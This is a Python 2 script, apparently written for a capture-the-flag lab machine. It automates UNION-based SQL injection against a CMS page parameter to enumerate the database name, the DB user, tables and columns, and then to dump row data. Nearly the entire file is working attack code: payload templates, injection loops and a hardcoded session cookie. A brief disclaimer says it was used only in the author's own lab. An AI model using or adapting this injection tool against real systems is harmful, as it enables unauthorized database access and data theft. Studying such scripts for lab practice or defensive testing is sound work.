'''
@Author: Captain Darkshade

Twitter: @cdarkshade
YouTube: Captain Darkshade

Disclaimer: I am not a security professional nor do I consider myself as an expert. 
I am nothing more than a security enthusiast and a beginner at best. Scanning and 
attacking networks and computers without express permission is illegal in many countries. 
Code samples are provided as is and without warranty. All demos conducted in my own isolated lab.

'''

import requests
from termcolor import colored

# set target
target = 'http://192.168.2.8/imfadministrator/cms.php'

# set proxies
proxies = {
    'http' : 'http://localhost:8080'
}

information = {
    'tables' : [],
    'data' : []
}

payloads  = [
    {
        'description' : 'Gettng current database', 
        'payload' :"concat('+++',hex(database()),'+++')",
        'key' : '+++current_database+++',
        'tokens' : [],
        'multi' : False
    },
    {
        'description' : 'Getting current db user ', 
        'payload' :"concat('+++',hex(user()),'+++')",
        'key' : 'current_db_user',
        'tokens' : [],
        'multi' : False
    },
    {
        'description' : 'Getting tables for current database', 
        'payload' : "concat('+++',hex(table_name),'+++') FROM INFORMATION_SCHEMA.TABLES WHERE table_schema IN ('+++current_database+++') limit 1 offset +++offset+++" ,
        'key' : 'table',
        'tokens' : ['+++current_database+++', '+++offset+++'],
        'multi' : True
    },
    {
        'description' : 'Getting columns for current table', 
        'payload' : "concat('+++',hex(column_name),'+++') FROM INFORMATION_SCHEMA.COLUMNS WHERE table_schema IN ('+++current_database+++') and table_name in ('+++table+++') limit 1 offset +++offset+++" ,
        'key' : 'column',
        'tokens' : ['+++current_database+++', '+++offset+++', '+++table+++'],
        'multi' : True
    },
    {
        'description' : 'Exfiltrating Data', 
        'payload' : "concat('+++',+++column+++,'+++') from +++table+++ limit 1 offset +++offset+++" ,
        'key' : 'data',
        'tokens' : ['+++offset+++', '+++table+++', '+++column+++'],
        'multi' : True,
    }
]

# iterate through our payloads
for payload in payloads:
    offset = 0 # track our row
    info = '' # tmp for info
    data = True # track if data was returned
    tableoffset = 0 # track which table we are in
    columnoffset = 0 # track which column

    print colored("[i] ", "blue") + payload['description']

    # make sure we are logged in with a session
    cookies = {
        'PHPSESSID' : '77scvd03rgchjbfqivjd1af2q4'
    }

    while data: # if we have data continue with this payload
        info = ''
        injection = "' union all select %s;# " % payload['payload'] # base injection

        # replace tokens for database, table, columns
        for token in payload['tokens']:
                if token == '+++offset+++':
                    injection = injection.replace(token, str(offset))
                elif token == '+++table+++':
                    injection = injection.replace(token, information['tables'][tableoffset].keys()[0])
                    try:
                        injection = injection.replace(token, information['tables'][tableoffset].keys()[0])
                        if offset == 0 and payload['key'] == 'table':
                            print colored("[i] ", "blue") + "Enumerating table: " + information['tables'][tableoffset].keys()[0]
                    except:
                        data = False
                        continue
                elif token == '+++column+++':
                    try:
                        injection = injection.replace(token, information['tables'][tableoffset][information['tables'][tableoffset].keys()[0]]['columns'][columnoffset])
                    except:
                        index = 1
                        logvalue = 0
                        break
                else:
                    injection = injection.replace(token, information[token])
        
        # print injection
        params = {
            'pagename' : injection
        }
        r = requests.get(target, proxies=proxies, cookies=cookies, params=params)
        if r.status_code >= 200 and r.status_code < 300:
            try:
                if payload['key'] == 'data':
                    info += r.content.split('+++')[1] # couldn't figure out how to hex it
                else:
                    info += r.content.split('+++')[1].decode("hex")
                if payload['key'] == 'table':
                    table = {}
                    table[info] = {'columns' : []}
                    information['tables'].append(table)
                elif payload['key'] == 'column':
                        information['tables'][tableoffset][information['tables'][tableoffset].keys()[0]]['columns'].append(info)
                else:
                    information[payload['key']] = info
            except:
                info = ''
                data = False
            

        if  payload['multi'] and payload['key'] != 'data':
            print colored("[$] ", "green") + payload['key'] + ': ' + info
            offset += 1 # increment row
        elif payload['multi'] and payload['key'] == 'data':
            try:
                print colored("[$] ", "green") + information['tables'][tableoffset][information['tables'][tableoffset].keys()[0]]['columns'][columnoffset] + ': ' + info
            except:
                pass
            columnoffset += 1
            if columnoffset > len(information['tables'][tableoffset][information['tables'][tableoffset].keys()[0]]['columns']):
                columnoffset = 0 # out of columns start over
                offset += 1 # increment row
                data = True
        else:
            print colored("[$] ", "green") + payload['key'] + ': ' + info
            data = False
print information
